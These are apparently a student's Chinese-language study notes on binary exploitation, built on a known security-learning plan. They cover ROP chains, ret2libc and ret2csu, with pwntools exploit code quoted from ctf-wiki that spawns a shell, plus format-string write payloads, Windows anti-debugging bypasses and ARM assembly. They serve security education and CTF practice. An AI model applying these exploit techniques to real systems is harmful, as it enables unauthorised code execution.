---
title: 365 Days Xuanwu Job Note
date: 2026-08-11 15:33:37
categories:
- dev
- cybersecurity
---

来源: 知名开源项目https://github.com/Vancir/365-days-get-xuanwulab-job

对内容进行了一些更新，以及部分比较基础的内容去除/合并了。以下是学习笔记

### Day 1
这两日的主要内容是经典的stackoverflow加上ROP exploit. 主要使用的工具是pwntools, pwndbg, ghidra
首先是复习一些x86的汇编

`call`等价于
* push the address of the next instruction (return address)
* jump to the function

cdecl calling convention: 由caller来修改esp(即清除stack上的arguments)

`leave`即离开当前stack frame，约等于把ebp和esp归位
`ret` pop出return address然后jump回去
`dword ptr`: double word pointer
`dword ptr [esp], eax`: 将esp视作指向32bit value的pointer，将eax的值写入其中

工具和小技巧:
* `pwndbg`中可以设置`layout pwndbg`，类似于gdb自己的tui，可以可视化地看assembly, stack之类的。ctrl+x a关闭/开启
* `pwndbg`可以用`tele`查看stack上的状况
* `strings`查看executable中的ascii字符串，用`-n`指定最短长度，比如5

ROP(return oriented programming)是一种利用程序中已有的一些gadgets来改变某些register/变量的值，进而达到控制整个control flow的目的的攻击方式

接下来讲解[basic ROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)中的几个案例。

**ret2text**: 首先用`checksec`看到没有PIE。然后直接启动pwndbg在main打上bp。用`strings`查找字符串发现有`/bin/sh`，然后在pwndbg中search找到对应的位置。
我们会发现有个隐藏的`secure`函数(可以通过ghidra/IDA也可以通过直接查看symbols来确认)
然后我们查看ebp和buffer的地址，然后算出偏移，就可以直接构造payload了。需要overwrite的值就是`buffer - ebp + 4`，`ebp`指向的地方存的是旧的ebp，在他上面则是存的return address
也可以直接用`pwn cyclic`生成cyclic 串然后输入，再直接看ebp的地方存了什么，然后用`pwn cyclic -l`查看就行。

**ret2shellcode**: 基本上一样，区别在于目标buffer从stack移动到了bss。然后我们需要自己构造shellcode填入buffer然后执行。

**ret2syscall**: 这个更加复杂一些。首先找到return address的offset是112。然后我们的目标是利用gadgets来执行`execve("/bin/sh", NULL, NULL)`来获得shell。

我们需要构造的stack长这样
```text
lower addresses
+-----------------------------+
| 0x080bb196                  | <- pop eax ; ret
+-----------------------------+
| 0x0000000b                  | <- value for EAX // pop eax会吃掉这个
+-----------------------------+
| 0x0806eb90                  | <- pop edx ; pop ecx ; pop ebx ; ret
+-----------------------------+
| 0x00000000                  | <- value for EDX
+-----------------------------+
| 0x00000000                  | <- value for ECX
+-----------------------------+
| 0x080be408                  | <- value for EBX: address of "/bin/sh"
+-----------------------------+
| 0x08049421                  | <- int 0x80 // trigger syscall的interrupt
+-----------------------------+
higher addresses
```

基本原理就是，`ret`会从stack上pop出下一个instruction的地址，所以可以通过这种方式chain起来
我们需要用`ROPgadget`寻找这些gadget的地址，然后再构造payload

**ret2libc**: 
plt: Procedure Linkage Table
在执行libc函数，比如`puts`的时候，会出现`call puts@plt`，其中`.plt`中的`puts`不是真正的代码，而是一个跳板，帮助找到libc中真正`puts`的位置。
got: Global Offset Table
地址表，在第一次call的时候got中还没有libc函数的真正地址，因此plt会直接跑到`plt0`然后把控制权交给linker的resolver。最终会计算出`puts = libc_base + puts_offset`，而后写会got (即lazy binding，要用的时候再bind)。

因此，只需要把got中某个libc函数的address print出来，我们就可以知道offset，进而可以把control flow导向libc中的gadgets
如果PIE关闭，那么程序本身的`puts@plt`和`puts@got`是知道的。构造rop chain: 
```
pop rdi ; ret
puts@got  // elf.got["puts"]
puts@plt
main
```
然后再从print出的信息，计算offset从而构造新的payload执行attack。
如果开启了PIE，则main program自己也会被随机化base address，在这种情况下需要先想办法获取main program中某些的address，然后获得base，再加上`puts@plt`和`puts@got`的offset

这个就对应ret2libc的example 3的操作

### Day 2
**ret2csu**: 理念上和basic rop是一样的，但是用的gadget不一样，因此会更复杂一点。
这里利用的是`__libc_csu_init`中的gadgets。两个gadget分别是
```text
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
...
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
```
第一部分从r13-r15中获取rdx, rsi, edi然后调用`r12`指向的函数(`r12`应该储存一个指向函数的指针，而不是直接储存函数地址)
写入`edi`只会写入low32b，而high32b会被清空，但在这里问题不大。
第二部分从stack上pop出如上的这些registers的值。
然后直接看ctfwiki上的exploit:
```py
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    time.sleep(1)

# 实际上应该写成
def csu_call(rbx=0, rbp=1, pointer_to_func, arg3, arg2, arg1, back_to)
```
几个点:
* 先进入第二个gadget，控制register的值，然后return到第一个gadget
* `'a' * 0x38`是因为我们不会执行`jnz`，而是在第一个gadget执行完回到第二个gadget，执行`add rsp,8`开始的instructions，因此我们需要pad `8+8*6=56=0x38`个bytes。最后再回到`last`指定的位置



然后我们来看几个csu的call
```py
sh.recvuntil(b'Hello, World\n')
csu(0, 1, write_got, 8, write_got, 1, main_addr)
```
等价于`write(1, write_got, 8)`，即向`stdout`(1) 写入`8` bytes的值，值为`write_got`(即`write`在got中储存的地址)
当然最终需要回到`main`来进行下一步exploit

```py
write_addr = u64(sh.recv(8))
log.info(f"Leaked write address: {hex(write_addr)}")

libc_base = write_addr - libc.symbols['write']
log.success(f"Libc base address: {hex(libc_base)}")

execve_addr = libc_base + libc.symbols['execve']
log.success(f"Execve address: {hex(execve_addr)}")
# 上面的计算获取offset和execve的地址

sh.recvuntil(b'Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')
```
上面这个call相当于`read(0, bss_base, 16)`，即从`stdin`(0)读取`16` bytes到`bss_base`。
而后写入地址，8byte的`execve_addr`和8byte的`"/bin/sh\0"`
这是因为`r12`需要一个pointer to function，因此我们必须先找个地方存下这个pointer

```py
sh.recvuntil(b'Hello, World\n')
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```
这个就简单了，相当于`*bss_base("/bin/sh", 0, 0)`，即`execve("/bin/sh", 0, 0)`。

文中还介绍了一个技巧: CPU的instruction decode并不会管哪里是boundary
假设我们有一条instruction
```asm
41 5d    pop r13
```
如果从当中开始decode，那么
```asm
5d       pop rbp
```
也就是加了这个`41` 相当于给register的index加了8。
更重要的是x86的instruction本身是variable length的，也就是说一个instruction从当中切开，前面是prefix而后面还是一个完整的instruction。而cpu会直接执行这个完整的instruction，不会再往后面读。所以，后续的指令并不会被我们这个从中间切开的地址影响。

**BROP** Blind ROP
攻击条件是有stackoverflow，并且服务器crash后重启地址不变，即ASLR只有最初启动时有用。
首先暴力枚举溢出长度直到程序crash。按照byte一个个进行爆破，64b最多需要$2^8\times 8 = 2048$次
这个exploit比较复杂

然后需要寻找能用的gadgets。
* stop gadgets，即程序进入这个状态后会无限循环而不会crash。这样attacker才能知道自己猜到了对的gadget
* trap gadgets, 进入后程序立刻crash的gadget.
* brop gadgets, 能控制传参的gadget，典型例子为csu尾部的rop chain

在stack上摆放stop/trap gadgets，不断probe。通过程序是否crash来找出不会pop stack的gadget; 只pop一个variable的gadget; ...
如果probe本身是个stop gadgets，只要后面都是trap gadgets就可以发现。

寻找plt：plt表结构规整，大部分plt调用都不太会crash。如果发现连续的16B对齐地址都没crash，+6后也不crash，那么就要怀疑是否碰到了plt
然后需要确认plt中的`strcmp`(或其他类似函数)，用来控制rdx，而后寻找`write`或者`puts`之类的输出函数(write需要3个参数，因此需要`strcmp`或其他函数来控制rdx)。`strcmp`只有在两个参数都不是bad address的时候才会执行，这个性质可以用来确定哪个表项是`strcmp`

后面的例子比较复杂，之后可以重新review一下

**Format String Vulnerability**: 这个比较简单。如果用户可以控制format string，那么首先可以用大量`%s`来让程序crash，也可以直接dump stack上的内容，甚至可以用`%n`进行任意写。

总体思想就是padding+address+写入。比如
`[addr]%012d%6$n`
先写address，然后需要知道我们的format string在stack上的位置，这里是第6个format arg，所以我们用`%6$n`来把值写入第六个argument代表的pointer(即`addr`)，然后用`%012d`进行padding，把值pad到16，或者其他我们希望写入的值。
另外address不一定需要放在最前面。比如我们希望写入`2`，那也可以直接`aa%8$n[addr]`之类的(`8`是随便写的数字)
对于写入大数字，我们倾向于用`%hhn`(单byte)和`%hn`(双byte)

在例子一节里介绍的攻击：
* hijack GOT，直接把puts之类的函数的got项修改为system或其他危险函数的地址，在下次执行puts时就会直接执行system
* hijact return address，获得offset，然后直接修改return address到想要的地方
* 堆上字符串，将栈迁移上堆(stack pivoting)。这个比较麻烦，需要寻找很多地址。因为format string在heap上也就意味着往stack上一直读并不会读到format string自身，也就没办法直接在format string里面注入一个address。但是在这个example里，saved ebp本身会被当作format argument读到。但因为我们只能直接往saved ebp写，也就意味着我们不能用`hhn`之类的手段，只能一次写完，这可能导致exploit失败

### Day 3
**Windows Anti-debug**:
主要参考[这篇](https://ctf-wiki.org/reverse/platform/windows/anti-debug/example/)
* `IsDebuggerPresent`: 单纯检测`BeingDebugged` flag的值，直接手动设置一下或者手动改返回值就可以绕过。
* `NtGlobalFlag`: PEB中的一个字段，有一些flag。只有进程由debugger创建(而非attach)时才会被设置。绕过检测也很简单，用一些插件，`windbg -hd`禁用调试堆，也可以直接手动修改flag的值。
* `Interrupt 3`: `EXCEPTION_BREAKPOINT(0x80000003)`触发时，`EIP`不会像其他异常处理时一样被指向异常的下一句指令。
* `CheckRemoteDebuggerPresent`: remote指的是同一台机器的不同进程，检测指定进程是否在被debug。通过`NtQueryInformationProcess`来完成。可以直接修改值或者jump flag来绕过。
* `NtQueryInformationProcess()`: 有几个信息类。`ProcessDebugPort`来自内核，很难直接绕过。通过读取`EPROCESS`的`DebugPort`来判断。还有一些其他的信息类
* `ZwSetInformationThread()`: 通过传入特定参数来禁止thread产生调试事件。绕过只需要修改传入函数的参数。
* 时间差检测: 获取调试和非调试下的时间差异来判断

**VM检测**:
* BIOS
* 字符串特征
* VMWare IO Port

其他的保护策略:
数据校验: 计算好checksum运行时比较是否被修改
内存校验: 类似，检测一些不应该被修改的segment是否被修改
Shadow Stack: 在存return address时在另一个栈上(shadow stack)也存一份，返回前检查两个地址是否相等。这能有效阻止ROP
Windows CFG (Control Flow Guard): 在security的课程中学到过。简单来说就是分析正常来说当前函数可能会jump到哪些函数。如果jump到不应该去的函数，那就说明control flow被劫持了，比如有人利用了stackoverflow，然后试图return回一些危险的函数来获得控制权。
Virtualization Obfuscation: 自己定义一套VM，寄存器，stack，opcode，把原始代码翻译成自己的bytecode再执行。
保护壳: 用来保护软件不被非法修改或反编译的技术。先于程序运行，拿到控制权，完成保护软件的任务。有压缩壳，即运行时再解压，和加密壳，即运行时再解密。但壳本身也是一个正常程序，仍然可以被debug。可以通过一些debug手段来停在OEP(original entry point)之前，把真正的程序dump出来。
IAT(Import Address Table) Obfuscation: 导入表加密，防止attacker通过IAT获得太多symbol信息，把API的语义隐藏。具体来说，可以用API hashing，即算hash来找到匹配的api，让api只以一串hash的形式出现。IAT模拟: 自己实现一些可能调用的外部函数
模块拷贝移位: 用来对抗hook。重新读一份dll，然后加载。在原来的dll上设置的hook就被绕开了。
代码混淆(obfuscation): 用一些策略来干扰静态分析工具，包括
* String Encryption: 避免暴露裸的string text
* Dynamic code loading / packing: 在运行时load一些代码而不是直接全部打包
* Control Flow Obfuscation: 即加入一些垃圾让程序的control flow变得乱七八糟，难以分析。
* Dead Code Injection: 注入垃圾代码让reverse engineering时需要分析的东西变多
* Symbol Stripping: rename一些本来比较固定的symbols
* Control Flow Flattening: 用dispatcher/state machine代替原本的control flow
* Junk Code: 增加垃圾，干扰静态分析

(Arm部分移动到Day 4)

### Day 4
ARM32，主要基于 https://azeria-labs.com/writing-arm-assembly-part-1/
(AArch32即ARM Architecture 32Bits, 和ARM32是一个意思)
以下内容如无额外说明则均基于ARM32，在最后会有关于ARM64的部分

Part I. Intro
ARM是RISC (reduced instruction set computing)处理器，instruction的数量更少，registers更多。只有load/store可以access memory. 在version 3后ARM是Bi-endian的，可以自己设置

Part II. Data Types and Regs
`-h`,`-sh`: half words; `-b`, `-sb`: bytes; no extension: words
比如，
```
ldr: load word
ldrh: load half word
ldrsh: load signed half word
ldrsb: load signed byte
```

30 registers, 16在usermode可用。
* `r0-12`都是general purpose
* `r7`一般约定存syscall number
* `r11-15`分别是FP (frame pointer), IP (intra procedural call scratch register，就是一个在函数调用时存临时值的register), SP (stack pointer), LR (link register，即return address), PC (program counter)
* CSPR: current program status register

Function call的前四个arg约定在r0-r3
在执行过程中，`PC`会指向当前instruction+8 (2条instructions后, ARM state) 或+4 (2条thumb instructions后，thumb state)。这个设计是为了兼容性，因为旧的arm processor一次fetch两条instructions

`CSPR`: 有很多flag类似于x86的`EFLAG`，包括N(negative, =SF),Z(zero, =ZF),C(carry, =CF),V(overflow, =OF), E (endian), T (thumb)之类的
(subtraction的结果$\geq 0$的时候，carry会被设置为1)

Part III. ARM & THUMB
ARM state的instruction永远是32b，Thumb state时16b但也可以时32b。这个在不同arm版本下都有所不同，比较复杂，在用的时候应该check对应版本的说明。

* ARM的所有instruction都支持conditional execution (run/skip based on status flags，可以减少不必要的branch/jump)。Thumb在某些版本有支持。
* ARM支持barrel shift. barrel shifter时一个hardware，在执行指令的同时执行shift。因此可以执行类似`MOV R1, R0, LSL #1`的指令，即把R0移动给R1，同时左移一位

在ARM和Thumb之间switch: 
* 可以用BX (branch and exchange), BLX (branch, link, and exchange)去把目标register的LSB修改为1。这不会导致alignment issue因为processor在执行时会忽略LSB
* CPSR的T bit如果是1，就代表我们在Thumb mode

ARM指令基本格式是
```
mnemonic{suffix}{condition} {dest_reg}, operand1, operand2
```
`condition`就是CPSR的特殊bit。`#...`表示immediate value
```asm
ADD R0, R1, R2    @ R0 = R1 + R2
ADD R0, R1, #2    @ R0 = R1 + 2
MOVLE R0, #5      @ if E is set, R0 = 5
MOV R0, R1, LSL #1   @ R0 = (R1 << 1)
```

Part IV. Load and Store
和x86不同，ARM里只有load/store可以access memory。
offset的形式可以是immediate value, register，或scaled register

最基本的:
```asm
LDR R2, [R0]   @ R2 = *R0
STR R2, [R1]   @ *R1 = R2
```

在assembly中可以用label或者PC-relative addressing表示地址
Offset形式
* `STR Ra, [Rb, #imm]`即`*(Rb+imm) = Ra`
* `STR Ra, [Rb, #imm]!` (pre-indexed)，即`*(Rb+imm) = Ra; Rb += imm`
* `STR Ra, [Rb], #imm` (post-indexed), 即`*Rb = Ra; Rb += imm`

使用register的形式类似，即把`#imm`替换为register
使用scaled register形式也类似，即`STR Ra, [Rb, Rc, <shifter>]`
* `STR R2, [R1, R2, LSL#2]`: `*(R1+R2<<2) = R2`

Pseudo-instructions: 可以用下面的方法去reference data in the literal pool
`ldr r0, =jump` (load the address of the label `jump`)

ARM instruction的组成和immediate value的限制:
ARM单条instruction长32b。conditional code占4爸，dest register占2b，第一个operand占2b，set-status flag占1b，还有opcode本身占用的bits，因此在设计上，每条instruction只有12b可以用来存immediate values。然后这12b被拆分为8b的number，以及4b的right rotation field
对于太大的value，除了直接拆以外，也可以用上面的技巧，比如`LDR r1,=511`。如果这里的值比较小则会被assembler转换为mov

Part V. Load/Store Multiple
`LDM`和`STM`可以用来load/store多个值
`ADR r0, words+12`: `r0 = &words[3]`
`LDM r0, {r4,r5}`: `r4 = *r0; r5 = *(r0+4)`
`STM r1, {r4,r5}`: `*r1 = r4; *(r1+4) = r5`
Variations: `-IA` (increase after), `-IB`(increase before), `-DA` (decrease after), `-DB`(decrease before)
`LDM` is the same as `LDMIA`, address for the next element is *increased after* each load. 
`LDMIB`类似，相当于从`+4`的offset起始，连续读入
`LDMDA`使用时，registers本身也会loaded backwards，即
`LDMDA r0, {r4-r6}`相当于 `r6 = *r0; r5 = *(r0-4); r4 = *(r0-8)`
`LDMDB`类似，相当于从`-4`的offset起始

Push and Pop. 
* `push`相当于`sp-4`然后把值放在新的`sp`指向的地方
* `pop`相当于从`sp`指向的地方读一个值，然后把`sp+4`

`push {r0, r1}`相当于`stmdb sp!, {r0, r1}`(因此实际order是先r1再r0)
`pop {r4, r5}`相当于`ldmia sp!, {r4, r5}`

Part VI. Conditional Execution
一共有16个conditions，包括`EQ` (`Z==1`)，`GT` (`Z==0 && N==V`)，`LE` (`Z==1 || N!=V`)之类的
例子:
```asm
cmp r0, #3
addlt r0, r0, #1
```
相当于，如果`r0 < 3`，则`r0 += 1`。

对于Thumb，部分版本支持`IT` instruction (if-then)，具体来说，对于`IT`,下一个instruction会是conditional的，对于`ITT, ITE`(if-then-then, if-then-else)，后两个instructions是conditional的，还有`ITTE, ITTEE`
```
.code 16
ITE EQ
ADDEQ r1, #2 @ 这一条必须也是EQ
addne r1, #3 @ 这一条必须是inverse
```

Branches (jumps)用于If和loops，比如
```asm
cmp r1, r2
blt r1_lower
...

r1_lower:
...
```

这就是一个典型的if。类似地也可以创建一个loop
branch有三个指令
* `B` (branch): 直接jump
* `BL` (branch link): `LR = PC+4`，然后jump
* `BX` (branch exchange) 和 `BLX` (branch link exchange): 和B/BL一样，同时 exchange instruction set (ARM/Thumb)。需要一个register作为operand

Part VII. Stack and Functions
Stack有各种实现形式，比如full descending，sp指向最后一个合法元素，然后stack grows down
FP指向一个stack frame的底部，即这个stack frame开始的地方，stack frame中需要储存return address (即previous LR)，previous frame pointer，以及其他需要保存的registers。函数call的参数太多时stack也会被用来传参。
一个函数，就和x86的一样，由prologue，body，epilogue组成
prologue即把需要存的值push上stack; epilogue用来恢复在prologue存的值
返回值一般存R0; 对于leaf function，可以不用存LR


AArch64简介
这一部分在原计划没有，但现在AArch64还是比较popular的，mac证明了arm架构的潜力。因此这里略微进行一点学习。
首先register的数量变多，可用registers数从16变成31。然后ISA(Instruction Set Architecture) 从A32+Thumb变成A64。


Register上，arm64有`x0-x30`，然后`w0-w30`是64b register的low32bit view。写入`w` register会把upper 32b设置为0。此外有单独的`sp`。`pc`不再是一个GPR(general purpose register)，不能直接像操作其他register一样操作`pc`。`x29`是convention上的frame pointer。特别地，arm64提供了zero register `xzr`(64), `wzr`(32)。便于直接丢弃不需要的result，比如一个只需要设置flag的操作。比如，`cmp x0, x1`本质上是`subs xzr, x0, x1`

函数调用相关: arm64中直接用`ret`而不是`bx lr`。但调用时仍类似。registers分为caller-saved和callee-save，因为register数量变多了，这方便的convention自然也有一些变化。

arm64移除了arm32中的general conditional execution，因此大部分情况还是需要用branch。flag (NZCV)是一样的，但并不是所有instruction都会update flag，比如`add`不会修改NZCV而`adds`会

arm64的每条指令都是32b。因此immediate的范围仍然很小。但可以用`movz` (move zero，其他设置为0)，和`movk` (move keep，其他保持不变)来一次修改16b地读入immediate。此外还有`movn`，计算immediate的bitwise inverse后读入，也就是其他都是1。`add`/`sub`仍然是接受一个12b immediate + optional shift。对于logical指令，给的immediate被认为是代表一个repeated pattern(也就是可以很高效得进行状态压缩之类的操作，比如把8个`int8`压缩成一个`int64`后用mask操作)

arm64仍然可以进行barrel shift的操作。load和store基本一样。

由于指令长度被限制，jump的offset同样有限制。需要jump太远的话就需要assembler/linker搞一个veneer/trampoline

SIMD/floating point register: arm64提供`v0-v31`的128b register，同样有不同的view，比如`d0`就是64b view，可以进行`fadd`浮点数加的操作


原Day 4中还包含CTF中其他stackoverflow的内容，主要是stack pivoting和stack smash。前者在之前已经学习过，stack smash即利用canary检查到溢出后，调用`__stack_chk_fail`来print `argv[0]`的行为，覆盖`argv[0]`来泄露信息。